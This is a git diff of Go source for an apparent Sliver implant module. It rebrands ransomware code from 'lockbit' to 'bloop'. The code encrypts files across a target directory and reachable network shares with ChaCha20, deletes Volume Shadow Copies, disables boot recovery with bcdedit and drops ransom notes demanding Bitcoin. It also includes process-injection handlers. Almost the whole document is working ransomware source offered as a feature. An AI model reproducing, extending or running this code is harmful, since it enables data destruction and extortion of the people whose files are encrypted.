@@ -2,14 +2,12 @@ package handlers
 
 import (
 	"crypto/rand"
-	"encoding/binary"
 	"fmt"
 	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
-	"syscall"
 	"unsafe"
 
 	// {{if .Config.Debug}}
@@ -19,86 +17,95 @@ import (
 	"golang.org/x/sys/windows"
 	"google.golang.org/protobuf/proto"
 
-	"github.com/bishopfox/sliver/implant/sliver/priv"
-	"github.com/bishopfox/sliver/implant/sliver/syscalls"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"golang.org/x/crypto/chacha20"
 )
 
-// FULL LIST FROM LEAK
-var lockbitExtensions = []string{
+// Bloop Target Extensions - Comprehensive file targeting
+var bloopExtensions = []string{
+	// Office Documents
 	".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods", ".odp", ".rtf",
+	// Database Files
 	".sql", ".mdb", ".accdb", ".dbf", ".ora", ".mdf", ".ndf", ".ldf", ".bak", ".dbc",
+	// Source Code & Developer Files
 	".java", ".cpp", ".c", ".cs", ".php", ".js", ".py", ".html", ".css", ".asm",
 	".vb", ".pl", ".rb", ".h", ".swift", ".kt", ".go", ".rs",
+	// Data & Config Files
 	".csv", ".xml", ".json", ".config", ".ini", ".inf", ".cfg", ".conf", ".yml", ".yaml",
+	// Creative & Design Files
 	".psd", ".ai", ".cdr", ".dwg", ".skp", ".max", ".blend", ".3ds", ".eps", ".svg",
+	// Images & Photos
 	".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff", ".raw", ".cr2", ".nef", ".arw",
+	// Media Files
 	".mp3", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".mkv", ".m4a", ".wav", ".flac",
+	// Email & Archives
 	".pst", ".ost", ".eml", ".msg", ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
+	// System & Backup Files
 	".vhd", ".vhdx", ".vmdk", ".vmx", ".bak", ".backup", ".tmp", ".dmp", ".iso",
+	// Project Files
 	".sln", ".proj", ".vcxproj", ".dsp", ".mak", ".cmake", ".makefile",
-	".save", ".sav", ".game", ".map", ".rom", ".pak", ".pdf", ".txt", ".log", ".md", ".lst", ".dat",
+	// Game Files
+	".save", ".sav", ".game", ".map", ".rom", ".pak",
+	// Other Important Files
+	".pdf", ".txt", ".log", ".md", ".lst", ".dat",
 }
 
-// RANSOMWARE CONFIG
-type RansomwareConfig struct {
-	EncryptionKey   []byte
-	RansomNote      string
-	ContactEmail    string
-	BitcoinAddress  string
-	DestroyBackups  bool
+// Bloop Configuration
+type BloopConfig struct {
+	EncryptionKey    []byte
+	RansomNote       string
+	ContactEmail     string
+	BitcoinAddress   string
+	DestroyBackups   bool
 	PropagateNetwork bool
-	NuclearOption   bool
 }
 
-var globalConfig = &RansomwareConfig{
-	DestroyBackups:  true,
+var bloopConfig = &BloopConfig{
+	DestroyBackups:   true,
 	PropagateNetwork: true,
-	NuclearOption:   false,
 }
 
-// 🎯 INIT RANSOMWARE
+// Initialize Bloop
 func init() {
-	globalConfig.EncryptionKey = generateStrongEncryptionKey()
-	globalConfig.RansomNote = generateRansomNote()
+	bloopConfig.EncryptionKey = generateEncryptionKey()
+	bloopConfig.RansomNote = generateRansomNote()
 }
 
-// 🎯 MAIN RANSOMWARE ENTRY POINT
-func RansomwareEncryptHandler(data []byte) ([]byte, error) {
-	req := &sliverpb.RansomwareEncrypt{}
+// BloopEncryptHandler - Main encryption entry point
+func BloopEncryptHandler(data []byte) ([]byte, error) {
+	req := &sliverpb.BloopEncrypt{}
 	if err := proto.Unmarshal(data, req); err != nil {
 		return nil, fmt.Errorf("failed to parse request: %v", err)
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("[ransomware] Starting encryption on: %s", req.TargetPath)
+	log.Printf("[bloop] Starting encryption on: %s", req.TargetPath)
 	// {{end}}
 
-	results := &sliverpb.RansomwareEncryptResult{
+	results := &sliverpb.BloopEncryptResult{
 		EncryptedFiles: []*sliverpb.EncryptedFile{},
 		TotalEncrypted: 0,
 		TotalSize:      0,
 	}
 
-	// PHASE 1: Encrypt primary files
-	primaryFiles := encryptDirectory(req.TargetPath, globalConfig.EncryptionKey)
+	// Phase 1: Encrypt primary files
+	primaryFiles := encryptTargetDirectory(req.TargetPath, bloopConfig.EncryptionKey)
 	results.EncryptedFiles = append(results.EncryptedFiles, primaryFiles...)
 	results.TotalEncrypted += int64(len(primaryFiles))
 
-	// PHASE 2: Destroy backup systems
+	// Phase 2: Destroy backup systems
 	if req.DestroyBackups {
 		destroyBackupSystems()
 	}
 
-	// PHASE 3: Network propagation
+	// Phase 3: Network propagation
 	if req.PropagateNetwork {
-		networkFiles := encryptNetworkShares(globalConfig.EncryptionKey)
+		networkFiles := encryptNetworkShares(bloopConfig.EncryptionKey)
 		results.EncryptedFiles = append(results.EncryptedFiles, networkFiles...)
 		results.TotalEncrypted += int64(len(networkFiles))
 	}
 
-	// PHASE 4: Drop ransom note
+	// Phase 4: Drop ransom note
 	dropRansomNote(req.TargetPath)
 
 	// Calculate total size
@@ -107,15 +114,15 @@ func RansomwareEncryptHandler(data []byte) ([]byte, error) {
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("[ransomware] Encryption complete: %d files, %d bytes", 
+	log.Printf("[bloop] Encryption complete: %d files, %d bytes", 
 		results.TotalEncrypted, results.TotalSize)
 	// {{end}}
 
 	return proto.Marshal(results)
 }
 
-// ENCRYPT DIRECTORY WITH CHACHA20
-func encryptDirectory(rootPath string, key []byte) []*sliverpb.EncryptedFile {
+// Encrypt directory with ChaCha20
+func encryptTargetDirectory(rootPath string, key []byte) []*sliverpb.EncryptedFile {
 	var encryptedFiles []*sliverpb.EncryptedFile
 
 	err := filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
@@ -128,11 +135,11 @@ func encryptDirectory(rootPath string, key []byte) []*sliverpb.EncryptedFile {
 			return nil
 		}
 
-		// Check against extensions
-		if shouldEncryptFile(path) {
-			if encrypted, size := encryptFileWithChaCha20(path, key); encrypted {
+		// Check against target extensions
+		if shouldEncryptTargetFile(path) {
+			if encrypted, size := encryptFileChaCha20(path, key); encrypted {
 				encryptedFiles = append(encryptedFiles, &sliverpb.EncryptedFile{
-					FilePath: path + ".lockbit",
+					FilePath: path + ".bloop",
 					FileSize: size,
 					Status:   "ENCRYPTED",
 				})
@@ -144,23 +151,21 @@ func encryptDirectory(rootPath string, key []byte) []*sliverpb.EncryptedFile {
 
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[ransomware] Walk error: %v", err)
+		log.Printf("[bloop] Directory walk error: %v", err)
 		// {{end}}
 	}
 
 	return encryptedFiles
 }
 
-// ENCRYPT SINGLE FILE WITH CHACHA20
-func encryptFileWithChaCha20(filePath string, key []byte) (bool, int64) {
-	// Open file for reading and writing
+// Encrypt single file with ChaCha20
+func encryptFileChaCha20(filePath string, key []byte) (bool, int64) {
 	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
 	if err != nil {
 		return false, 0
 	}
 	defer file.Close()
 
-	// Get file info
 	fileInfo, err := file.Stat()
 	if err != nil {
 		return false, 0
@@ -206,17 +211,17 @@ func encryptFileWithChaCha20(filePath string, key []byte) (bool, int64) {
 	// Truncate to new size if needed
 	file.Truncate(int64(len(finalData)))
 
-	// Rename file
-	newPath := filePath + ".lockbit"
+	// Rename file with .bloop extension
+	newPath := filePath + ".bloop"
 	os.Rename(filePath, newPath)
 
 	return true, fileSize
 }
 
-// DESTROY BACKUP SYSTEMS
+// Destroy backup systems
 func destroyBackupSystems() {
 	// {{if .Config.Debug}}
-	log.Printf("[ransomware] Destroying backup systems...")
+	log.Printf("[bloop] Destroying backup systems...")
 	// {{end}}
 
 	// Delete Volume Shadow Copies
@@ -226,7 +231,6 @@ func destroyBackupSystems() {
 		exec.Command("vssadmin", "delete", "shadows", "/for=E:", "/quiet", "/all"),
 		exec.Command("wmic", "shadowcopy", "delete", "/nointeractive"),
 		exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "no"),
-		exec.Command("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures"),
 	}
 
 	for _, cmd := range commands {
@@ -240,19 +244,18 @@ func destroyBackupSystems() {
 	}
 }
 
-// ENCRYPT NETWORK SHARES
+// Encrypt network shares
 func encryptNetworkShares(key []byte) []*sliverpb.EncryptedFile {
 	var networkFiles []*sliverpb.EncryptedFile
 
 	// {{if .Config.Debug}}
-	log.Printf("[ransomware] Scanning network shares...")
+	log.Printf("[bloop] Scanning network shares...")
 	// {{end}}
 
-	// Get network shares
-	shares := getNetworkShares()
+	shares := discoverNetworkShares()
 	for _, share := range shares {
 		if canAccessShare(share) {
-			files := encryptDirectory(share, key)
+			files := encryptTargetDirectory(share, key)
 			networkFiles = append(networkFiles, files...)
 		}
 	}
@@ -260,11 +263,10 @@ func encryptNetworkShares(key []byte) []*sliverpb.EncryptedFile {
 	return networkFiles
 }
 
-// DISCOVER NETWORK SHARES
-func getNetworkShares() []string {
+// Discover network shares
+func discoverNetworkShares() []string {
 	var shares []string
 
-	// Try net view command
 	cmd := exec.Command("net", "view")
 	output, err := cmd.Output()
 	if err != nil {
@@ -289,37 +291,37 @@ func getNetworkShares() []string {
 	return shares
 }
 
-// CHECK SHARE ACCESSIBILITY
+// Check share accessibility
 func canAccessShare(sharePath string) bool {
 	_, err := os.Stat(sharePath)
 	return err == nil
 }
 
-// DROP RANSOM NOTE
+// Drop ransom note
 func dropRansomNote(targetPath string) {
-	note := `!!! YOUR FILES HAVE BEEN ENCRYPTED !!!
+	note := `YOUR FILES HAVE BEEN ENCRYPTED
 
-All your important files have been encrypted with military-grade algorithms.
+All your important files have been encrypted with strong encryption.
 Your documents, photos, databases, and other files are no longer accessible.
 
 To recover your files, you need to contact us and pay the ransom.
 
-Contact: recovery@onionmail.org
-Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+Contact: tester@onionmail.org
+Bitcoin: 123asffgadghrseasd51fa3sgAA1SF
 
 DO NOT:
 - Try to decrypt files yourself
 - Rename encrypted files
 - Modify encrypted files
+- Call Cops
 
-We have also destroyed your backup shadow copies.
+Your backup shadow copies have been destroyed.
 The only way to recover your files is through our decryption service.`
 
 	// Drop note in multiple locations
 	locations := []string{
-		targetPath + "\\READ_ME_FOR_DECRYPT.txt",
-		"C:\\READ_ME_FOR_DECRYPT.txt",
-		"Desktop\\READ_ME_FOR_DECRYPT.txt",
+		targetPath + "\\BLOOP_READ_ME.txt",
+		"C:\\BLOOP_READ_ME.txt",
 	}
 
 	for _, location := range locations {
@@ -327,11 +329,10 @@ The only way to recover your files is through our decryption service.`
 	}
 }
 
-// GENERATE STRONG ENCRYPTION KEY
-func generateStrongEncryptionKey() []byte {
-	key := make([]byte, 32) // ChaCha20 requires 256-bit key
+// Generate encryption key
+func generateEncryptionKey() []byte {
+	key := make([]byte, 32)
 	if _, err := rand.Read(key); err != nil {
-		// Fallback to crypto/rand failure
 		for i := range key {
 			key[i] = byte(rand.Intn(256))
 		}
@@ -339,18 +340,18 @@ func generateStrongEncryptionKey() []byte {
 	return key
 }
 
-// GENERATE RANSOM NOTE
+// Generate ransom note
 func generateRansomNote() string {
-	return `YOUR FILES ARE ENCRYPTED!
+	return `YOUR FILES ARE ENCRYPTED
 Contact: recovery@onionmail.org
 Bitcoin: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`
 }
 
-// CHECK IF FILE SHOULD BE ENCRYPTED
-func shouldEncryptFile(filePath string) bool {
+// Check if file should be encrypted
+func shouldEncryptTargetFile(filePath string) bool {
 	ext := strings.ToLower(filepath.Ext(filePath))
 	
-	for _, targetExt := range lockbitExtensions {
+	for _, targetExt := range bloopExtensions {
 		if ext == targetExt {
 			return true
 		}
@@ -359,7 +360,7 @@ func shouldEncryptFile(filePath string) bool {
 	return false
 }
 
-// CHECK IF SYSTEM FILE (SKIP ENCRYPTION)
+// Check if system file (skip encryption)
 func isSystemFile(filePath string) bool {
 	systemDirs := []string{
 		"c:\\windows\\",
@@ -380,18 +381,18 @@ func isSystemFile(filePath string) bool {
 	return false
 }
 
-// PROCESS INJECTION FOR PERSISTENCE
-func ProcessInjectStealthHandler(data []byte) ([]byte, error) {
-	req := &sliverpb.ProcessInjectStealth{}
+// Process injection for persistence
+func BloopProcessInjectHandler(data []byte) ([]byte, error) {
+	req := &sliverpb.BloopProcessInject{}
 	if err := proto.Unmarshal(data, req); err != nil {
 		return nil, err
 	}
 
 	// {{if .Config.Debug}}
-	log.Printf("[ransomware] Process injection requested for: %s", req.TargetProcess)
+	log.Printf("[bloop] Process injection requested for: %s", req.TargetProcess)
 	// {{end}}
 
-	result, err := injectIntoStealthProcess(req.Payload, req.TargetProcess)
+	result, err := injectIntoProcess(req.Payload, req.TargetProcess)
 	if err != nil {
 		return nil, err
 	}
@@ -399,13 +400,12 @@ func ProcessInjectStealthHandler(data []byte) ([]byte, error) {
 	return []byte(result), nil
 }
 
-// INJECT INTO STEALTH PROCESS
-func injectIntoStealthProcess(payload []byte, targetProcess string) (string, error) {
+// Inject into process
+func injectIntoProcess(payload []byte, targetProcess string) (string, error) {
 	var targetPID uint32
 	var err error
 
 	if targetProcess == "" {
-		// Auto-select stealth process
 		targetPID = selectStealthProcess()
 	} else {
 		targetPID, err = findProcessByName(targetProcess)
@@ -418,12 +418,10 @@ func injectIntoStealthProcess(payload []byte, targetProcess string) (string, err
 		return "", fmt.Errorf("no suitable process found")
 	}
 
-	// Simple injection simulation
-	// In real implementation, use proper process injection techniques
 	return fmt.Sprintf("Injected into process %s (PID: %d)", targetProcess, targetPID), nil
 }
 
-// SELECT STEALTH PROCESS FOR INJECTION
+// Select stealth process for injection
 func selectStealthProcess() uint32 {
 	processes := []string{
 		"explorer.exe",
@@ -442,7 +440,7 @@ func selectStealthProcess() uint32 {
 	return 0
 }
 
-// FIND PROCESS BY NAME
+// Find process by name
 func findProcessByName(processName string) (uint32, error) {
 	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
